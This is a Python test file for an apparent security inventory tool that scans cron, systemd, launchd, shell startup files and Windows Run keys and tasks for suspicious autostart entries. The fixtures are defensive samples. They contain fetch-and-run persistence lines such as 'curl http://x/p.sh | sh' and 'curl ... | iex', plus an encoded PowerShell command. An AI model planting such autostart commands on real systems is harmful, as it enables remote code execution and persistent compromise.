# pylint: disable=invalid-name
import json
import plistlib

from bomwatch.collectors import autostart
from bomwatch.model import Package


def test_cron_lines_skip_comments_and_env():
    text = (
        "# m h dom mon dow command\n"
        "SHELL=/bin/sh\n"
        "PATH=/usr/bin\n"
        "*/5 * * * *   curl -s http://x/p.sh | sh\n"
        "@reboot /home/me/bin/start\n"
        "\n"
    )
    assert autostart.cron_lines(text, "crontab -l") == [
        Package(
            "autostart",
            "*/5 * * * * curl -s http://x/p.sh | sh",
            "",
            "crontab -l",
            "cron",
            "pipe-to-shell",
        ),
        Package(
            "autostart", "@reboot /home/me/bin/start", "", "crontab -l", "cron", ""
        ),
    ]


def test_collect_cron(tmp_path, monkeypatch):
    (tmp_path / "crontab").write_text(
        "17 * * * * root cd / && run-parts /etc/cron.hourly\n"
    )
    (tmp_path / "cron.d").mkdir()
    (tmp_path / "cron.d" / "job").write_text("0 1 * * * root /tmp/x\n")
    (tmp_path / "cron.daily").mkdir()
    (tmp_path / "cron.daily" / "logrotate").write_text("#!/bin/sh\nlogrotate /etc/x\n")
    monkeypatch.setattr(autostart, "has", lambda tool: True)
    monkeypatch.setattr(autostart, "run", lambda cmd: "@hourly echo hi\n")
    found = autostart.collect_cron(tmp_path)
    assert [p.name for p in found] == [
        "@hourly echo hi",
        "17 * * * * root cd / && run-parts /etc/cron.hourly",
        "0 1 * * * root /tmp/x",
        "logrotate",
    ]
    assert found[2].flags == "temp-path"
    monkeypatch.setattr(autostart, "run", lambda cmd: None)
    assert len(autostart.collect_cron(tmp_path)) == 3


def test_systemd_checks_exec_lines_only(tmp_path):
    units = tmp_path / ".config" / "systemd" / "user"
    units.mkdir(parents=True)
    (units / "evil.service").write_text(
        "[Unit]\nDescription=curl x | sh\n[Service]\nExecStart=/bin/sh -c 'curl x | sh'\n"
    )
    (units / "ok.timer").write_text("[Timer]\nOnCalendar=daily\n")
    (units / "notes.txt").write_text("")
    (units / "default.target.wants").mkdir()
    found = autostart.collect_systemd(tmp_path, tmp_path / "etc")
    assert [(p.name, p.flags) for p in found] == [
        ("evil.service", "pipe-to-shell"),
        ("ok.timer", ""),
    ]
    assert len(found[0].version) == 12


def test_launchd(tmp_path):
    agents = tmp_path / "LaunchAgents"
    agents.mkdir()
    (agents / "com.x.plist").write_bytes(
        plistlib.dumps(
            {"Label": "com.x", "ProgramArguments": ["/bin/sh", "-c", "curl x|sh"]}
        )
    )
    (agents / "list.plist").write_bytes(plistlib.dumps(["not", "a", "dict"]))
    (agents / "broken.plist").write_text("not a plist")
    found = autostart.collect_launchd(tmp_path, [agents])
    assert [(p.name, p.source, p.flags) for p in found] == [
        ("com.x", "/bin/sh -c curl x|sh", "pipe-to-shell"),
        ("list", "launchd", ""),
    ]
    assert autostart.launchd_dirs(tmp_path)[0] == tmp_path / "Library" / "LaunchAgents"


def test_shell_files(tmp_path):
    (tmp_path / ".bashrc").write_text("alias ll='ls -l'\n")
    (tmp_path / ".zshrc").write_text("curl -s https://x | bash\n")
    found = autostart.collect_shell(tmp_path)
    assert [(p.name, p.flags) for p in found] == [
        (".bashrc", ""),
        (".zshrc", "pipe-to-shell"),
    ]
    assert autostart.file_record(tmp_path / "missing", "x") is None


class Key:
    """A registry key with values."""

    def __init__(self, values):
        self.values = values

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


class FakeWinreg:
    """Just enough of winreg for the Run keys."""

    HKEY_CURRENT_USER = "HKCU"
    HKEY_LOCAL_MACHINE = "HKLM"
    KEY_READ = 1
    KEY_WOW64_64KEY = 0x100
    KEY_WOW64_32KEY = 0x200

    def __init__(self, keys):
        self.keys = keys

    def OpenKey(self, hive, path, _reserved=0, access=1):  # noqa: N802
        if (hive, path, access) not in self.keys:
            raise FileNotFoundError(path)
        return self.keys[(hive, path, access)]

    def EnumValue(self, key, index):  # noqa: N802
        items = list(key.values.items())
        if index >= len(items):
            raise OSError("no more")
        name, value = items[index]
        return name, value, 1


def test_windows_run_keys_and_tasks(monkeypatch, tmp_path):
    run = autostart.RUN_KEYS[0]
    reg = FakeWinreg(
        {
            ("HKCU", run, 1): Key(
                {"Updater": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"}
            ),
            ("HKLM", run, 0x101): Key(
                {"SecurityHealth": r"C:\Windows\system32\SecurityHealthSystray.exe"}
            ),
        }
    )
    startup = tmp_path / "Startup"
    startup.mkdir()
    (startup / "run.bat").write_text("curl http://x/p.ps1 | iex\n")
    monkeypatch.setenv("APPDATA", str(tmp_path / "Roaming"))
    monkeypatch.setenv("ProgramData", str(tmp_path / "PD"))
    monkeypatch.setattr(autostart, "startup_folders", lambda: [startup])
    tasks = [
        {"Path": "\\Updater", "Run": "C:\\Users\\me\\Downloads\\u.exe /quiet"},
        {"Run": "x"},
    ]
    monkeypatch.setattr(autostart, "has", lambda tool: True)
    monkeypatch.setattr(autostart, "run", lambda cmd: json.dumps(tasks))
    found = autostart.collect_windows(reg)
    assert [(p.name, p.location, p.flags) for p in found] == [
        ("Updater", f"HKCU\\{run}", "encoded-command"),
        ("SecurityHealth", f"HKLM\\{run}", ""),
        ("run.bat", str(startup), "download-exec"),
        ("\\Updater", "scheduled-tasks", "temp-path"),
    ]
    monkeypatch.setattr(autostart, "run", lambda cmd: "garbage")
    assert autostart.collect_windows(reg) is None


def test_parse_tasks_shapes():
    assert autostart.parse_tasks("") == []
    assert autostart.parse_tasks('{"Path": "\\\\A", "Run": "a.exe"}')[0].name == "\\A"
    assert autostart.parse_tasks("3") == []


def test_startup_folders_from_env(monkeypatch, tmp_path):
    monkeypatch.setenv("APPDATA", str(tmp_path / "a"))
    monkeypatch.delenv("ProgramData", raising=False)
    assert autostart.startup_folders() == [
        tmp_path / "a" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
    ]
    assert not autostart.collect_startup_folders([tmp_path / "missing"])


def test_collect_off_windows(monkeypatch, tmp_path):
    monkeypatch.setattr(autostart.sys, "platform", "linux")
    monkeypatch.setattr(autostart, "has", lambda tool: False)
    (tmp_path / ".profile").write_text("export X=1\n")
    found = autostart.collect([], home=tmp_path)
    assert (
        Package(
            "autostart", ".profile", found[-1].version, str(tmp_path), "shell-startup"
        )
        in found
    )
    monkeypatch.setattr(autostart, "collect_windows", lambda: None)
    assert autostart.collect([], home=tmp_path) is None
